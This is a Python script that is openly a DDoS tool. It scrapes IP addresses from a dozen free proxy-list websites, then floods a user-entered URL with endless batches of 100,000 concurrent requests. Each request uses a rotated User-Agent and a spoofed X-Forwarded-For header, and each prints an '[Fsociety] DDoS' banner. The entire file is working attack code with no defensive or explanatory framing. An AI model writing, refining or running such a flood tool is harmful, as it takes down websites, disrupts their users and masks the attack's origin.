import asyncio
import aiohttp
import random
import re
import itertools
from colorama import Fore

target_url = input(Fore.WHITE + "Enter URL: ")

UserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",   
]

ip_list_urls = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1#google_vignette",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",

]

async def fetch_ip_addresses(url):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url) as response:
                text = await response.text()
                # hide css from proxy list
                ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
                print(f"Found {len(ip_addresses)} IP addresses from {url}")
                return ip_addresses
        except Exception as e:
            print(f"Error fetching IP list from {url}: {e}")
            return []

async def get_all_ips():
    tasks = [fetch_ip_addresses(url) for url in ip_list_urls]
    ip_lists = await asyncio.gather(*tasks)
    all_ips = [ip for sublist in ip_lists for ip in sublist]
    print(f"Total IP fetched: {len(all_ips)}")
    return all_ips

num_requests = int(input("Enter the number of requests to send: "))

ip_list = asyncio.run(get_all_ips())
if num_requests > len(ip_list):
    num_requests = len(ip_list)

async def send_request(session, ip_address):
    headers = {
        "User-Agent": random.choice(UserAgents),
        "X-Forwarded-For": ip_address
    }
    try:
        async with session.get(target_url, headers=headers) as response:
            print(Fore.RED + f"[Fsociety]" + Fore.WHITE + f"DDoS the {target_url} from IP: {ip_address} - Status Code: {response.status}")
    except Exception as e:
        print(f"Error sending request from IP: {ip_address} - {e}")

async def main():
    limit = 100000
    ip_cycle = itertools.cycle(ip_list)

    async with aiohttp.ClientSession() as session:
        while True:
            tasks = [send_request(session, next(ip_cycle)) for _ in range(limit)]
            await asyncio.gather(*tasks)

asyncio.run(main())
